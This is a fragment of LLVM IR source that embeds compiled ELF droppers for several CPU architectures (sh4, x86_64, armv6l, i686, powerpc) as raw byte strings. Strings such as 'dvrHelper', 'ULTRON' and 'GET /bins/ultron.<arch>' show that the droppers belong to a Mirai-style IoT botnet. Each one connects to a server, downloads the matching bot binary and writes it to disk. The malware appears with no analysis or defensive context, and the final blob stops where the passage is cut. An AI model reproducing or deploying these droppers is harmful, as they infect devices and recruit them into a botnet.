@.str.265 = private unnamed_addr constant [2049 x i8] c"\7FELF\01\01\01\00\00\00\00\00\00\00\00\00\02\00\08\00\01\00\00\00\E4\04@\004\00\00\00\E8\06\00\00\07\10\00\004\00 \00\03\00(\00\07\00\06\00\01\00\00\00\00\00\00\00\00\00@\00\00\00@\00T\06\00\00T\06\00\00\05\00\00\00\00\00\01\00\01\00\00\00`\06\00\00`\06D\00`\06D\00T\00\00\00p\00\00\00\06\00\00\00\00\00\01\00Q\E5td\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\07\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\FF\00\A50\00,\05\00\00&\04\00% \85\00\FF\00\E70\FF\00\C60% \87\00\002\06\00%0\C4\00\02\22\06\00\00\FF\C30\00\1A\03\00\00\FF\840\00\16\06\00\026\06\00%\10C\00%0\C4\00\08\00\E0\03%\10F\00\05\00\1C<d\85\9C'!\E0\99\03\5C\80\99\8F!(\80\00\08\00 \03\A1\0F\04$\05\00\1C<H\85\9C'!\E0\99\03\5C\80\99\8F!(\80\00\08\00 \03\A6\0F\04$\05\00\1C<,\85\9C'!\E0\99\03!\10\A0\00\5C\80\99\8F!8\C0\00!(\80\00!0@\00\08\00 \03\A5\0F\04$\05\00\1C<\04\85\9C'!\E0\99\03\D0\FF\BD'(\00\BF\AF\10\00\BC\AF\5C\80\99\8F\18\00\A4\AF\1C\00\A5\AF \00\A6\AF\06\10\04$\18\00\A6'\09\F8 \03\03\00\05$\10\00\BC\8F(\00\BF\8F\00\00\00\00\08\00\E0\030\00\BD'\05\00\1C<\B8\84\9C'!\E0\99\03!\10\A0\00\5C\80\99\8F!8\C0\00!(\80\00!0@\00\08\00 \03\A4\0F\04$\05\00\1C<\90\84\9C'!\E0\99\03!\10\A0\00\5C\80\99\8F!8\C0\00!(\80\00!0@\00\08\00 \03\A3\0F\04$\05\00\1C<h\84\9C'!\E0\99\03\D0\FF\BD'(\00\BF\AF\10\00\BC\AF\5C\80\99\8F\18\00\A4\AF\1C\00\A5\AF \00\A6\AF\06\10\04$\18\00\A6'\09\F8 \03\01\00\05$\10\00\BC\8F(\00\BF\8F\00\00\00\00\08\00\E0\030\00\BD'\05\00\1C<\1C\84\9C'!\E0\99\038\FF\BD'\C0\00\BF\AF\BC\00\B3\AF\B8\00\B2\AF\B4\00\B1\AF\B0\00\B0\AF\10\00\BC\AF\18\80\82\8F\00\00\00\00\00\06P$\00\00\02\82\00\00\00\00\FD\FF@\14\01\00\10&\FF\FF\10&\18\80\85\8F\18\80\82\8FH\80\99\8F\08\06\A5$\01\00\04$\07\00\06$\00\06B$\09\F8 \03#\98\02\02\10\00\BC\8F\02\00\02$L\80\99\8F\1C\00\A2\A7\00P\02$\D9\00\07$\A8\00\04$\EB\00\05$R\00\06$\09\F8 \03\1E\00\A2\A7\10\00\BC\8F\01\03\05$\18\80\84\8F`\80\99\8F\10\06\84$\FF\01\06$\09\F8 \03 \00\A2\AF\10\00\BC\8F\02\00\04$P\80\99\8F\02\00\05$!0\00\00\09\F8 \03!\90@\00!\88@\00\FF\FF\02$\10\00\BC\8F\03\00\22\12\00\00\00\00\07\00B\16\00\00\00\00T\80\99\8F\00\00\00\00\09\F8 \03\01\00\04$\10\00\BC\8F\00\00\00\00D\80\99\8F!  \02\1C\00\A5'\09\F8 \03\10\00\06$\10\00\BC\8F\0F\00A\04!\80@\00\18\80\85\8FH\80\99\8F\1C\06\A5$\01\00\04$\09\F8 \03\04\00\06$\10\00\BC\8F\00\00\00\00T\80\99\8F\00\00\00\00\09\F8 \03# \10\00\10\00\BC\8F\00\00\00\00\18\80\85\8FH\80\99\8F\1D\00p&$\06\A5$!  \02\09\F8 \03!0\00\02\10\00\BC\8F\07\00P\10!\80\00\00T\80\99\8F\00\00\00\00\09\F8 \03\03\00\04$\10\00\BC\8F!\80\00\008\80\99\8F!  \02\18\00\A5'\09\F8 \03\01\00\06$\10\00\BC\8F\01\00\03$T\80\99\8F\04\00C\10\04\00\04$\09\F8 \03\00\00\00\00\10\00\BC\8F\18\00\A3\83\00\12\10\00%\80C\00\0A\0D\02<\0A\0DB4\ED\FF\02\16\00\00\00\008\80\99\8F,\00\B0'!  \02!(\00\02\09\F8 \03\80\00\06$\10\00\BC\8F!(\00\02H\80\99\8F!0@\00\06\00@\18! @\02\09\F8 \03\00\00\00\00\10\00\BC\8F\F0\FF\00\10\00\00\00\00X\80\99\8F\00\00\00\00\09\F8 \03!  \02\10\00\BC\8F\00\00\00\00X\80\99\8F\00\00\00\00\09\F8 \03! @\02\10\00\BC\8F\01\00\04$\18\80\85\8FH\80\99\8FL\06\A5$\09\F8 \03\04\00\06$\10\00\BC\8F\00\00\00\00T\80\99\8F\00\00\00\00\09\F8 \03\05\00\04$\10\00\BC\8F\C0\00\BF\8F\BC\00\B3\8F\B8\00\B2\8F\B4\00\B1\8F\B0\00\B0\8F\08\00\E0\03\C8\00\BD'\05\00\1C<l\81\9C'!\E0\99\03!\00\E0\03\01\00\11\04\00\00\00\00\05\00\1C<T\81\9C'!\E0\9F\03!\F8\00\00<\80\99\8F\00\00\00\00\08\00 \03\00\00\00\00\00\00\00\00\05\00\1C<0\81\9C'!\E0\99\03!\10\80\00! \A0\00!(\C0\00!0\E0\00\10\00\A7\8F\14\00\A8\8F\18\00\A9\8F\1C\00\AA\8F\E0\FF\BD'\10\00\A8\AF\14\00\A9\AF\18\00\AA\AF\1C\00\A2\AF\1C\00\A2\8F\0C\00\00\00\03\00\E0\14 \00\BD'\08\00\E0\03\00\00\00\00! @\00@\80\99\8F\00\00\00\00\08\00 \03\00\00\00\00\00\00\00\00\05\00\1C<\C0\80\9C'!\E0\99\03\E0\FF\BD'\1C\00\BF\AF\18\00\B0\AF\10\00\BC\AF4\80\99\8F\00\00\00\00\09\F8 \03!\80\80\00\10\00\BC\8F\00\00P\AC\1C\00\BF\8F\18\00\B0\8F\FF\FF\02$\08\00\E0\03 \00\BD'\00\00\00\00\00\00\00\00\05\00\1C<p\80\9C'!\E0\99\030\80\82\8F\08\00\E0\03\00\00\00\00\00\00\00\00\00\00\00\00mipsel\00\00ULTRON\0A\00dvrHelper\00\00\00NIF\0A\00\00\00\00GET /bins/ultron.mipsel HTTP/1.0\0D\0A\0D\0A\00\00\00\00FIN\0A\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\80\00\00@\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\C0\06D\00\E0\05@\00\C0\01@\004\02@\00\90\05@\00L\01@\00\98\01@\00\A0\00@\00\E8\01@\00\EC\00@\00\08\01@\00 \05@\00$\01@\00\00.shstrtab\00.text\00.rodata\00.got\00.bss\00.mdebug.abi32\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00\A0\00@\00\A0\00\00\00`\05\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\00\06@\00\00\06\00\00T\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\01\00\00\00\03\00\00\10`\06D\00`\06\00\00T\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\04\00\00\00\1E\00\00\00\08\00\00\00\03\00\00\00\C0\06D\00\B4\06\00\00\10\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00#\00\00\00\01\00\00\00\00\00\00\00H\00\00\00\B4\06\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\00\B4\06\00\001\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@dropper_sh4 = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([2049 x i8], [2049 x i8]* @.str.265, i32 0, i32 0), i8* null], align 16
@dropper_x86_64 = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([1361 x i8], [1361 x i8]* @.str.266, i32 0, i32 0), i8* null], align 16
@.str.266 = private unnamed_addr constant [1361 x i8] c"\7FELF\02\01\01\00\00\00\00\00\00\00\00\00\02\00>\00\01\00\00\00V\03@\00\00\00\00\00@\00\00\00\00\00\00\00\10\04\00\00\00\00\00\00\00\00\00\00@\008\00\03\00@\00\05\00\04\00\01\00\00\00\05\00\00\00\00\00\00\00\00\00\00\00\00\00@\00\00\00\00\00\00\00@\00\00\00\00\00\EA\03\00\00\00\00\00\00\EA\03\00\00\00\00\00\00\00\00\10\00\00\00\00\00\01\00\00\00\06\00\00\00\EC\03\00\00\00\00\00\00\EC\03P\00\00\00\00\00\EC\03P\00\00\00\00\00\00\00\00\00\00\00\00\00\0C\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00Q\E5td\06\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\08\00\00\00\00\00\00\00\C1\E7\18H\C1\E6\10\0F\B6\C9\81\E6\00\00\FF\00Hc\FFH\C1\E2\08H\09\F7\81\E2\00\FF\00\00H\09\CFH\09\FA\89\D1\89\D0\81\E1\00\FF\00\00\C1\E0\18\C1\E1\08\09\C8H\89\D1\81\E2\00\00\FF\00\81\E1\00\00\00\FFH\C1\EA\08H\C1\E9\18\09\D1\09\C8\C3\89\FE1\C0\BF<\00\00\00\E9\12\02\00\00\89\FE1\C0\BF\03\00\00\00\E9\04\02\00\00\89\D11\C0\89\F2H\89\FE\BF\02\00\00\00\E9\F1\01\00\00\89\D11\C0H\89\F2\89\FE\BF*\00\00\00\E9\DE\01\00\00\89\D11\C0H\89\F2\89\FE\BF\01\00\00\00\E9\CB\01\00\00\89\D11\C0H\89\F2\89\FE1\FF\E9\BB\01\00\00\89\D11\C0\89\F2\89\FE\BF)\00\00\00\E9\A9\01\00\00AU\BA\A3\03@\00ATUSH\81\EC\A8\00\00\00\EB\03H\FF\C2\80z\FF\00u\F7\8D\05\CD\01\00\00A\89\D5\BE\A9\03@\00\BA\07\00\00\00\BF\01\00\00\00A)\C5\E8\8E\FF\FF\FF\B9\D9\00\00\00\BAR\00\00\00\BE\EB\00\00\00\BF\A8\00\00\00f\C7\84$\80\00\00\00\02\00f\C7\84$\82\00\00\00\00P\E8\CB\FE\FF\FF\BA\FF\01\00\00\BEA\02\00\00\BF\B1\03@\00\89\84$\84\00\00\00\E8 \FF\FF\FF1\D2\BE\01\00\00\00\BF\02\00\00\00A\89\C4\E8U\FF\FF\FF\83\F8\FF\89\C5\0F\94\C2A\83\FC\FF\0F\94\C0\08\C2t\0A\BF\01\00\00\00\E8\D3\FE\FF\FFH\8D\B4$\80\00\00\00\BA\10\00\00\00\89\EF\E8\EE\FE\FF\FF\85\C0\89\C3y\1D\BF\01\00\00\00\BA\04\00\00\00\BE\BB\03@\00\F7\DB\E8\E5\FE\FF\FF\89\DF\E8\9C\FE\FF\FFA\8D]\1D\BE\C0\03@\00\89\EF\89\DA\E8\CC\FE\FF\FF9\D8t\0A\BF\03\00\00\00\E8|\FE\FF\FF1\DBH\8D\B4$\9F\00\00\00\BA\01\00\00\00\89\EF\E8\BB\FE\FF\FF\FF\C8t\0A\BF\04\00\00\00\E8X\FE\FF\FF\0F\BE\84$\9F\00\00\00\C1\E3\08\09\C3\81\FB\0A\0D\0A\0Du\C9\BA\80\00\00\00H\89\E6\89\EF\E8\89\FE\FF\FF\85\C0~\0F\89\C2H\89\E6D\89\E7\E8e\FE\FF\FF\EB\DE\89\EF\E8(\FE\FF\FFD\89\E7\E8 \FE\FF\FF\BA\04\00\00\00\BE\E5\03@\00\BF\01\00\00\00\E8@\FE\FF\FF\BF\05\00\00\00\E8\F4\FD\FF\FFH\81\C4\A8\00\00\00[]A\5CA]\C3\E9X\FE\FF\FF\90H\89\F8H\89\F7H\89\D6H\89\CAM\89\C2M\89\C8L\8BL$\08\0F\05H=\01\F0\FF\FF\0F\83\03\00\00\00\C3\90\90H\83\EC\08H\89\C1H\F7\D9\E8\09\00\00\00\89\08\83\C8\FFZ\C3\90\90\B8\EC\03P\00\C3x86_64\00ULTRON\0A\00dvrHelper\00NIF\0A\00GET /bins/ultron.x86_64 HTTP/1.0\0D\0A\0D\0A\00FIN\0A\00\00\00\00.shstrtab\00.text\00.rodata\00.bss\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00\00\00\00\00\E8\00@\00\00\00\00\00\E8\00\00\00\00\00\00\00\BA\02\00\00\00\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\00\00\00\00\A2\03@\00\00\00\00\00\A2\03\00\00\00\00\00\00H\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\19\00\00\00\08\00\00\00\03\00\00\00\00\00\00\00\EC\03P\00\00\00\00\00\EC\03\00\00\00\00\00\00\0C\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\EC\03\00\00\00\00\00\00\1E\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 1
@dropper_armv6l = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([1465 x i8], [1465 x i8]* @.str.267, i32 0, i32 0), i8* null], align 16
@.str.267 = private unnamed_addr constant [1465 x i8] c"\7FELF\01\01\01\00\00\00\00\00\00\00\00\00\02\00(\00\01\00\00\00\8C\83\00\004\00\00\00\A0\04\00\00\02\00\00\044\00 \00\03\00(\00\07\00\06\00\01\00\00\00\00\00\00\00\00\80\00\00\00\80\00\00P\04\00\00P\04\00\00\05\00\00\00\00\80\00\00\01\00\00\00P\04\00\00P\04\01\00P\04\01\00\0C\00\00\00\14\00\00\00\06\00\00\00\00\80\00\00Q\E5td\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\07\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\018\83\E1\00<\83\E1\024\83\E1\03\0C\A0\E1\02\08\80\E1\FF(\03\E2\22\04\80\E1#\0C\80\E1\1E\FF/\E1\04\E0-\E5\00\10\A0\E1\04\D0M\E2\01\00\A0\E3\AD\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\00\10\A0\E1\04\D0M\E2\06\00\A0\E3\A5\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\05\00\A0\E3\9A\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\0C\00\9F\E5\8F\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\1B\01\00\00\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\04\00\A0\E3\83\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\03\00\A0\E3x\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\0C\00\9F\E5m\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\19\01\00\00\F0A-\E9t1\9F\E5\98\D0M\E2\00\80\A0\E3\00\00\00\EA\01\80\88\E2\01`S\E5\00\00V\E3\010\83\E2\FA\FF\FF\1AT\11\9F\E5\07 \A0\E3\01\00\A0\E3\CF\FF\FF\EB\02\C0\A0\E3\D90\A0\E3\EB\10\A0\E3R \A0\E3\B4\C8\CD\E1\A8\00\A0\E3\05\CA\A0\E3\B6\C8\CD\E1\96\FF\FF\EB$\11\9F\E5\88\00\8D\E5 !\9F\E5 \01\9F\E5\AA\FF\FF\EB\01\10\A0\E3\00p\A0\E1\06 \A0\E1\02\00\A0\E3\D2\FF\FF\EB\01\00p\E3\01\00w\13\00P\A0\E1\01\00\A0\03\90\FF\FF\0B\05\00\A0\E1\84\10\8D\E2\10 \A0\E3\A7\FF\FF\EB\00@P\E2\05\00\00\AA\01\00\A0\E3\D8\10\9F\E5\04 \A0\E3\AD\FF\FF\EB\00\00d\E2\84\FF\FF\EB\1D@\88\E2\05\00\A0\E1\C0\10\9F\E5\04 \A0\E1\A6\FF\FF\EB\04\00P\E1\03\00\A0\13|\FF\FF\1B\AC\80\9F\E5\06@\A0\E1\97`\8D\E2\06\10\A0\E1\01 \A0\E3\05\00\A0\E1\A7\FF\FF\EB\01\00P\E3\04\00\A0\E3r\FF\FF\1B\970\DD\E5\04D\83\E1\08\00T\E1\F4\FF\FF\1A\04@\8D\E2\04\10\A0\E1\80 \A0\E3\05\00\A0\E1\9B\FF\FF\EB\00 P\E2\04\10\A0\E1\07\00\A0\E1\01\00\00\DA\8B\FF\FF\EB\F5\FF\FF\EA\05\00\A0\E1i\FF\FF\EB\07\00\A0\E1g\FF\FF\EB<\10\9F\E5\04 \A0\E3\01\00\A0\E3\82\FF\FF\EB\05\00\A0\E3Y\FF\FF\EB\98\D0\8D\E2\F0A\BD\E8\1E\FF/\E1\FD\83\00\00\04\84\00\00A\02\00\00\FF\01\00\00\0C\84\00\00\18\84\00\00 \84\00\00\0A\0D\0A\0DH\84\00\00\95\FF\FF\EA\0D\C0\A0\E1\F0\00-\E9\00p\A0\E1\01\00\A0\E1\02\10\A0\E1\03 \A0\E1x\00\9C\E8\00\00\00\EF\F0\00\BD\E8\01\0Ap\E3\0E\F0\A01\FF\FF\FF\EA\10@-\E9\00@\A0\E1\04\00\00\EB\00@d\E2\00@\80\E5\00\00\E0\E3\10@\BD\E8\1E\FF/\E1\0C0\9F\E5\0C\00\9F\E5\030\8F\E0\00\00\83\E0\1E\FF/\E1`\80\00\00\0C\00\00\00armv6l\00\00ULTRON\0A\00dvrHelper\00\00\00NIF\0A\00\00\00\00GET /bins/ultron.armv6l HTTP/1.0\0D\0A\0D\0A\00\00\00\00FIN\0A\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00A\0F\00\00\00aeabi\00\01\05\00\00\00\00.shstrtab\00.text\00.rodata\00.got\00.bss\00.ARM.attributes\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00\A0\80\00\00\A0\00\00\00\5C\03\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\FC\83\00\00\FC\03\00\00T\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\01\00\00\00\03\00\00\00P\04\01\00P\04\00\00\0C\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\04\00\00\00\1E\00\00\00\08\00\00\00\03\00\00\00\5C\04\01\00\5C\04\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00#\00\00\00\03\00\00p\00\00\00\00\00\00\00\00\5C\04\00\00\10\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\00l\04\00\003\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@dropper_i686 = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([1197 x i8], [1197 x i8]* @.str.268, i32 0, i32 0), i8* null], align 16
@.str.268 = private unnamed_addr constant [1197 x i8] c"\7FELF\01\01\01\00\00\00\00\00\00\00\00\00\02\00\03\00\01\00\00\00$\83\04\084\00\00\00\E4\03\00\00\00\00\00\004\00 \00\03\00(\00\05\00\04\00\01\00\00\00\00\00\00\00\00\80\04\08\00\80\04\08\C1\03\00\00\C1\03\00\00\05\00\00\00\00\10\00\00\01\00\00\00\C4\03\00\00\C4\93\04\08\C4\93\04\08\00\00\00\00\04\00\00\00\06\00\00\00\00\10\00\00Q\E5td\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\06\00\00\00\04\00\00\00U\89\E5\0F\B6U\08\0F\B6E\0C\0F\B6M\10\C1\E2\18\C1\E0\10\09\C2\0F\B6E\14\C1\E1\08]\09\C2\09\D1\89\CA\89\C8\81\E2\00\FF\00\00\C1\E2\08\C1\E0\18\09\D0\89\CA\81\E1\00\00\FF\00\C1\EA\18\C1\E9\08\09\CA\09\D0\C3U\89\E5\83\EC\10\FFu\08j\01\E8D\02\00\00\83\C4\10\C9\C3U\89\E5\83\EC\10\FFu\08j\06\E8/\02\00\00\C9\C3U\89\E5\83\EC\08\FFu\10\FFu\0C\FFu\08j\05\E8\17\02\00\00\C9\C3U\89\E5\83\EC\1C\8BE\08\89E\F4\8BE\0C\89E\F8\8BE\10\89E\FC\8DE\F4Pj\03jf\E8\F0\01\00\00\C9\C3U\89\E5\83\EC\08\FFu\10\FFu\0C\FFu\08j\04\E8\D8\01\00\00\C9\C3U\89\E5\83\EC\08\FFu\10\FFu\0C\FFu\08j\03\E8\C0\01\00\00\C9\C3U\89\E5\83\EC\1C\8BE\08\89E\F4\8BE\0C\89E\F8\8BE\10\89E\FC\8DE\F4Pj\01jf\E8\99\01\00\00\C9\C3U\B8}\83\04\08\89\E5WVS\81\EC\AC\00\00\00\EB\01@\808\00u\FA-}\83\04\08\89\85P\FF\FF\FFPj\07h\82\83\04\08j\01\E8v\FF\FF\FFh\D9\00\00\00jRh\EB\00\00\00h\A8\00\00\00f\C7E\E0\02\00f\C7E\E2\00P\E8\A6\FE\FF\FF\83\C4\1Ch\FF\01\00\00hA\02\00\00h\8A\83\04\08\89E\E4\E8\FB\FE\FF\FF\83\C4\0Cj\00j\01j\02\89\C7\E8Z\FF\FF\FF\83\C4\10\83\F8\FF\89\C6t\05\83\FF\FFu\0D\83\EC\0Cj\01\E8\AB\FE\FF\FF\83\C4\10Pj\10\8DE\E0PV\E8\DA\FE\FF\FF\83\C4\10\85\C0\89\C3y\1CP\F7\DBj\04h\94\83\04\08j\01\E8\E7\FE\FF\FF\89\1C$\E8y\FE\FF\FF\83\C4\10\8B\9DP\FF\FF\FFP\83\C3\1DSh\99\83\04\08V\E8\C6\FE\FF\FF\83\C4\109\D8t\0D\83\EC\0Cj\03\E8O\FE\FF\FF\83\C4\101\DBPj\01\8DE\F3PV\E8\BB\FE\FF\FF\83\C4\10Ht\0D\83\EC\0Cj\04\E8-\FE\FF\FF\83\C4\10\0F\BEE\F3\C1\E3\08\09\C3\81\FB\0A\0D\0A\0Du\CFQh\80\00\00\00\8D\9D`\FF\FF\FFSV\E8\84\FE\FF\FF\83\C4\10\85\C0~\0ERPSW\E8\5C\FE\FF\FF\83\C4\10\EB\D8\83\EC\0CV\E8\FD\FD\FF\FF\89<$\E8\F5\FD\FF\FF\83\C4\0Cj\04h\BC\83\04\08j\01\E85\FE\FF\FF\C7\04$\05\00\00\00\E8\C3\FD\FF\FF\83\C4\10\8De\F4[^_]\C3U\89\E5]\E9l\FE\FF\FF\90\90\90UWVS\8Bl$,\8B|$(\8Bt$$\8BT$ \8BL$\1C\8B\5C$\18\8BD$\14\CD\80[^_]=\01\F0\FF\FF\0F\83\01\00\00\00\C3\83\EC\0C\89\C2\F7\DA\E8\09\00\00\00\89\10\83\C8\FF\83\C4\0C\C3\B8\C4\93\04\08\C3i686\00ULTRON\0A\00dvrHelper\00NIF\0A\00GET /bins/ultron.i686 HTTP/1.0\0D\0A\0D\0A\00FIN\0A\00\00\00\00\00.shstrtab\00.text\00.rodata\00.bss\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00\94\80\04\08\94\00\00\00\E9\02\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00}\83\04\08}\03\00\00D\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\01\00\00\00\19\00\00\00\08\00\00\00\03\00\00\00\C4\93\04\08\C4\03\00\00\04\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\00\C4\03\00\00\1E\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@dropper_powerpc = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([1421 x i8], [1421 x i8]* @.str.269, i32 0, i32 0), i8* null], align 16
@.str.269 = private unnamed_addr constant [1421 x i8] c"\7FELF\01\02\01\00\00\00\00\00\00\00\00\00\00\02\00\14\00\00\00\01\10\00\03\E8\00\00\004\00\00\04\C4\00\00\00\00\004\00 \00\03\00(\00\05\00\04\00\00\00\01\00\00\00\00\10\00\00\00\10\00\00\00\00\00\04\A4\00\00\04\A4\00\00\00\05\00\01\00\00\00\00\00\01\00\00\04\A4\10\01\04\A4\10\01\04\A4\00\00\00\00\00\00\00\08\00\00\00\06\00\01\00\00dt\E5Q\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\06\00\00\00\04T\84\80\1ETc\C0\0E|c#xT\A5@.|c3x|\A3\1BxN\80\00 |\08\02\A6\94!\FF\F0|d\1Bx8`\00\01\90\01\00\14L\C61\82H\00\03%\80\01\00\148!\00\10|\08\03\A6N\80\00 |\08\02\A6\94!\FF\F0|d\1Bx8`\00\06\90\01\00\14L\C61\82H\00\02\F9\80\01\00\148!\00\10|\08\03\A6N\80\00 |\08\02\A6\94!\FF\F0|\A6+x\90\01\00\14|\80#x|\05\03x|d\1Bx8`\00\05L\C61\82H\00\02\C1\80\01\00\148!\00\10|\08\03\A6N\80\00 \94!\FF\E0|\08\02\A6\90a\00\088`\00f\90\81\00\0C8\80\00\03\90\A1\00\108\A1\00\08\90\01\00$L\C61\82H\00\02\85\80\01\00$8!\00 |\08\03\A6N\80\00 |\08\02\A6\94!\FF\F0|\A6+x\90\01\00\14|\80#x|\05\03x|d\1Bx8`\00\04L\C61\82H\00\02M\80\01\00\148!\00\10|\08\03\A6N\80\00 |\08\02\A6\94!\FF\F0|\A6+x\90\01\00\14|\80#x|\05\03x|d\1Bx8`\00\03L\C61\82H\00\02\15\80\01\00\148!\00\10|\08\03\A6N\80\00 \94!\FF\E0|\08\02\A6\90a\00\088`\00f\90\81\00\0C8\80\00\01\90\A1\00\108\A1\00\08\90\01\00$L\C61\82H\00\01\D9\80\01\00$8!\00 |\08\03\A6N\80\00 \94!\FF@|\08\02\A6= \10\00\BF\81\00\B0;\A9\04P\90\01\00\C4H\00\00\08;\BD\00\01\88\1D\00\00/\80\00\00@\9E\FF\F4<\80\10\00= \10\009)\04P8\84\04X8\A0\00\078`\00\01\7F\A9\E8PK\FF\FF\0D8\00\00\028\C0\00\D98\80\00\EB8\A0\00R\B0\01\00\0C8`\00\A88\00\00P\B0\01\00\0EK\FF\FE\01\90a\00\10<`\10\008\80\02A8\A0\01\FF8c\04`K\FF\FE]8\80\00\01||\1Bx8\A0\00\008`\00\02K\FF\FF-/\83\FF\FF|~\1BxA\9E\00\0C/\9C\FF\FF@\BE\00\0C8`\00\01K\FF\FD\D5\7F\C3\F3x8\81\00\0C8\A0\00\10K\FF\FEU|\7F\1By@\A0\00 <\80\10\008`\00\018\84\04l8\A0\00\04K\FF\FEu|\7F\00\D0K\FF\FD\A1;\BD\00\1D<\80\10\008\84\04t\7F\C3\F3x\7F\A5\EBxK\FF\FEU\7F\83\E8\00A\9E\00\0C8`\00\03K\FF\FDy;\A0\00\008\81\00\088\A0\00\01\7F\C3\F3xK\FF\FEi/\83\00\018`\00\04A\9E\00\08K\FF\FDU\89a\00\08W\A9@.<\00\0D\0A}=[x`\00\0D\0A\7F\9D\00\00@\9E\FF\C8;\A1\00\1C8\A0\00\80\7F\A4\EBx\7F\C3\F3xK\FF\FE)\7F\A4\EBx|e\1By\7F\83\E3x@\81\00\0CK\FF\FD\DDK\FF\FF\D8\7F\C3\F3xK\FF\FD1\7F\83\E3xK\FF\FD)<\80\10\008\84\04\9C8\A0\00\048`\00\01K\FF\FD\B58`\00\05K\FF\FC\E1\80\01\00\C4\BB\81\00\B08!\00\C0|\08\03\A6N\80\00 K\FF\FE@|`\1Bx|\83#x|\A4+x|\C53x|\E6;x}\07CxD\00\00\02L\83\00 H\00\00\04|\08\02\A6\94!\FF\E0\BF\A1\00\14|}\1Bx\90\01\00$H\00\00!\93\A3\00\008`\FF\FF\80\01\00$\BB\A1\00\148!\00 |\08\03\A6N\80\00 <`\10\018c\04\A4N\80\00 